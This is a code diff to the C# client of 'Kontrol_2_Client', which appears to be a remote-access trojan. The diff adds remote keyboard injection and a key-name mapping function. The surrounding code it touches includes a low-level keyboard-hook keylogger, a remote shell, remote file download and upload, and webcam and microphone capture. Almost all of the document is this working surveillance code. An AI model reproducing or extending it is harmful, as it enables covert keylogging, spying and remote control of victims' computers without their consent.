@@ -201,8 +201,8 @@ namespace Kontrol_2_Client
 		delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
 		static IntPtr HookCallBack(int nCode, IntPtr wParam, IntPtr lParam)
 		{
-			//  Terminate the message loop
-			if (!runKeyLogger) Application.Exit();
+            // Terminate the message loop
+            if (!runKeyLogger) UnhookWindowsHookEx(klHook);
 
             if (nCode >= 0 && wParam == (IntPtr) WM_KEYDOWN)
             {
@@ -247,9 +247,17 @@ namespace Kontrol_2_Client
         static StreamReader fromShell;
         static StreamWriter toShell;
         static StreamReader error;
+
+		enum FileOperation : byte
+		{ 
+			DOWNLOAD,
+			UPLOAD,
+			NONE
+		}
         static byte fo_mode = 3; // 3 = none, 0 = download, 1 = upload
         static string fo_path = string.Empty;
         static int fo_size = 0, fo_writeSize = 0;
+
         static byte[] fileBuffer;
         static FilterInfoCollection videoDevices;
         static VideoCaptureDevice videoSource;
@@ -370,7 +378,7 @@ namespace Kontrol_2_Client
 				}
 				catch (Exception ex)
 				{
-					// MessageBox.Show(ex.Message + "\n" + ex.StackTrace);
+					MessageBox.Show(ex.Message + "\n" + ex.StackTrace);
 					Reconnect();
 				}
 			}
@@ -408,8 +416,10 @@ namespace Kontrol_2_Client
 			
 			new Thread(() => // Literally the laziest but quickest way to make this multithreaded, it works so i dont care!!! 
             {
+				// servMod^
 				if (recBuf[0] == 0xFE)
                 {
+					// servMod Operation
                     switch (recBuf[1])
                     {
 						// Remote Desktop
@@ -421,12 +431,11 @@ namespace Kontrol_2_Client
                             {
 								// Mouse Click
 								case 0xA0:
-                                    // The common size for an int32 is 4 bytes so I can hard code this
-                                    byte[] xBytes = new byte[4];
-									byte[] yBytes = new byte[4];
+                                    byte[] xBytes = new byte[sizeof(int)];
+									byte[] yBytes = new byte[sizeof(int)];
 
-									Buffer.BlockCopy(recBuf, 4, xBytes, 0, 4);
-                                    Buffer.BlockCopy(recBuf, 8, yBytes, 0, 4);
+									Buffer.BlockCopy(recBuf, sizeof(int), xBytes, 0, sizeof(int));
+                                    Buffer.BlockCopy(recBuf, sizeof(int) * 2, yBytes, 0, sizeof(int));
 
 									int x = BitConverter.ToInt32(xBytes);
 									int y = BitConverter.ToInt32(yBytes);
@@ -465,10 +474,12 @@ namespace Kontrol_2_Client
                                             currentMouseState = MouseState.MIDDLE_HOLD;
                                             break;
 									}
-                                    //SetCursorPos(int.Parse(xsplit[2]), int.Parse(xsplit[3]));
                                     break;
 								// Keyboard Key press
 								case 0xA1:
+									Console.WriteLine($"Key sent: {KeyToStr(recBuf[3])}");
+									try { SendKeys.Send("{" + KeyToStr(recBuf[3]) + "}"); }
+									catch { }
 									break;
                             }
                             break;
@@ -1097,7 +1108,7 @@ namespace Kontrol_2_Client
                                 klHook = SetHook(llkProcedure);
                                 Application.Run();
 
-                                //  If the message hook get terminated then we will unhook the Low Level Keyboard Hook
+                                //  If the message hook gets terminated then we will unhook the keyboard hook
                                 UnhookWindowsHookEx(klHook);
                             }).Start();
                         }
@@ -1248,22 +1259,22 @@ namespace Kontrol_2_Client
 		{
 			try
 			{
-				//  1
-				//  Get array of all file names.
+				// 1
+				// Get array of all file names.
 				string[] a = Directory.GetFiles(path, "*.*");
 
-				//  2
-				//  Calculate total bytes of all files in a loop.
+				// 2
+				// Calculate total bytes of all files in a loop.
 				long b = 0;
 				foreach (string name in a)
 				{
-					//  3
-					//  Use FileInfo to get length of each file.
+					// 3
+					// Use FileInfo to get length of each file.
 					FileInfo info = new FileInfo(name);
 					b += info.Length;
 				}
-				//  4
-				//  Return total size
+				// 4
+				// Return total size
 				return b;
 			}
 			catch { return 0; }
@@ -1272,18 +1283,16 @@ namespace Kontrol_2_Client
 		static long GetDirectorySizeOld(DirectoryInfo d)
 		{
 			long size = 0;
-			//  Add file sizes.
+
+			// Add file sizes.
 			FileInfo[] fis = d.GetFiles();
 			foreach (FileInfo fi in fis)
-			{
 				size += fi.Length;
-			}
-			//  Add subdirectory sizes.
+
+			// Add subdirectory sizes.
 			DirectoryInfo[] dis = d.GetDirectories();
 			foreach (DirectoryInfo di in dis)
-			{
 				size += GetDirectorySizeOld(di);
-			}
 			return size;
 		}
 		static void HClock(bool hide)
@@ -1329,7 +1338,7 @@ namespace Kontrol_2_Client
 			SpeechSynthesizer synthesizer = new SpeechSynthesizer();
 			synthesizer.Volume = vol;  //  0...100
 			synthesizer.Rate = rate;     //  -10...10
-			//  Asynchronous
+			// Asynchronous
 			synthesizer.SpeakAsync(text);
 		}
 
@@ -1384,7 +1393,8 @@ namespace Kontrol_2_Client
 				audioSource.DataAvailable += audioSource_NewAudio;
 				audioSource.RecordingStopped += (s, a) =>
 				{
-					audioSource.Dispose();
+					try { audioSource.Dispose(); }
+					catch { }
 					audioSource = null;
 				};
 				audioSource.StartRecording(); 
@@ -1654,6 +1664,119 @@ namespace Kontrol_2_Client
 				GC.Collect();
 				GC.WaitForPendingFinalizers();
 			}
+		}
+		static string KeyToStr(int key)
+		{
+			string keyStr;
+
+			if (key == 8) keyStr = "Backsapce";
+			else if (key == 9) keyStr = "Tab";
+			else if (key == 13) keyStr = "Enter";
+			else if (key == 19) keyStr = "Pause";
+			else if (key == 20) keyStr = "CapsLock";
+			else if (key == 27) keyStr = "Esc";
+			else if (key == 32) keyStr = "Space";
+			else if (key == 33) keyStr = "PgUp";
+			else if (key == 34) keyStr = "Page Down";
+			else if (key == 35) keyStr = "End";
+			else if (key == 36) keyStr = "Home";
+			else if (key == 37) keyStr = "Left";
+			else if (key == 38) keyStr = "Up";
+			else if (key == 39) keyStr = "Right";
+			else if (key == 40) keyStr = "Down";
+			else if (key == 44) keyStr = "PrtSc";
+			else if (key == 45) keyStr = "Insert";
+			else if (key == 46) keyStr = "Delete";
+			else if (key == 48) keyStr = "0";
+			else if (key == 49) keyStr = "1";
+			else if (key == 50) keyStr = "2";
+			else if (key == 51) keyStr = "3";
+			else if (key == 52) keyStr = "4";
+			else if (key == 53) keyStr = "5";
+			else if (key == 54) keyStr = "6";
+			else if (key == 55) keyStr = "7";
+			else if (key == 56) keyStr = "8";
+			else if (key == 57) keyStr = "9";
+			else if (key == 65) keyStr = "a";
+			else if (key == 66) keyStr = "b";
+			else if (key == 67) keyStr = "c";
+			else if (key == 68) keyStr = "d";
+			else if (key == 69) keyStr = "e";
+			else if (key == 70) keyStr = "f";
+			else if (key == 71) keyStr = "g";
+			else if (key == 72) keyStr = "h";
+			else if (key == 73) keyStr = "i";
+			else if (key == 74) keyStr = "j";
+			else if (key == 75) keyStr = "k";
+			else if (key == 76) keyStr = "l";
+			else if (key == 77) keyStr = "m";
+			else if (key == 78) keyStr = "n";
+			else if (key == 79) keyStr = "o";
+			else if (key == 80) keyStr = "p";
+			else if (key == 81) keyStr = "q";
+			else if (key == 82) keyStr = "r";
+			else if (key == 83) keyStr = "s";
+			else if (key == 84) keyStr = "t";
+			else if (key == 85) keyStr = "u";
+			else if (key == 86) keyStr = "v";
+			else if (key == 87) keyStr = "w";
+			else if (key == 88) keyStr = "x";
+			else if (key == 89) keyStr = "y";
+			else if (key == 90) keyStr = "z";
+			else if (key == 91) keyStr = "Windows";
+			else if (key == 92) keyStr = "Windows";
+			else if (key == 93) keyStr = "List";
+			else if (key == 96) keyStr = "0";
+			else if (key == 97) keyStr = "1";
+			else if (key == 98) keyStr = "2";
+			else if (key == 99) keyStr = "3";
+			else if (key == 100) keyStr = "4";
+			else if (key == 101) keyStr = "5";
+			else if (key == 102) keyStr = "6";
+			else if (key == 103) keyStr = "7";
+			else if (key == 104) keyStr = "8";
+			else if (key == 105) keyStr = "9";
+			else if (key == 106) keyStr = "*";
+			else if (key == 107) keyStr = "+";
+			else if (key == 109) keyStr = "-";
+			else if (key == 110) keyStr = ",";
+			else if (key == 111) keyStr = "/";
+			else if (key == 112) keyStr = "f1";
+			else if (key == 113) keyStr = "f2";
+			else if (key == 114) keyStr = "f3";
+			else if (key == 115) keyStr = "f4";
+			else if (key == 116) keyStr = "f5";
+			else if (key == 117) keyStr = "f6";
+			else if (key == 118) keyStr = "f7";
+			else if (key == 119) keyStr = "f8";
+			else if (key == 120) keyStr = "f9";
+			else if (key == 121) keyStr = "f10";
+			else if (key == 122) keyStr = "f11";
+			else if (key == 123) keyStr = "f12";
+			else if (key == 144) keyStr = "NumLock";
+			else if (key == 145) keyStr = "ScrollLock";
+			else if (key == 160) keyStr = "+";
+			else if (key == 161) keyStr = "+";
+			else if (key == 162) keyStr = "^";
+			else if (key == 163) keyStr = "^";
+			else if (key == 164) keyStr = "%";
+			else if (key == 165) keyStr = "%";
+			else if (key == 187) keyStr = "=";
+			else if (key == 186) keyStr = "ç";
+			else if (key == 188) keyStr = ",";
+			else if (key == 189) keyStr = "-";
+			else if (key == 190) keyStr = ".";
+			else if (key == 192) keyStr = "'";
+			else if (key == 191) keyStr = ";";
+			else if (key == 193) keyStr = "/";
+			else if (key == 194) keyStr = ".";
+			else if (key == 219) keyStr = "´";
+			else if (key == 220) keyStr = "]";
+			else if (key == 221) keyStr = "[";
+			else if (key == 222) keyStr = "~";
+			else if (key == 226) keyStr = "\\";
+			else keyStr = key.ToString();
+			return keyStr;
 		}
 		static void DirectoryCopy(string sourceDirName, string destDirName, bool copySubDirs) // microsoft code lol
 		{
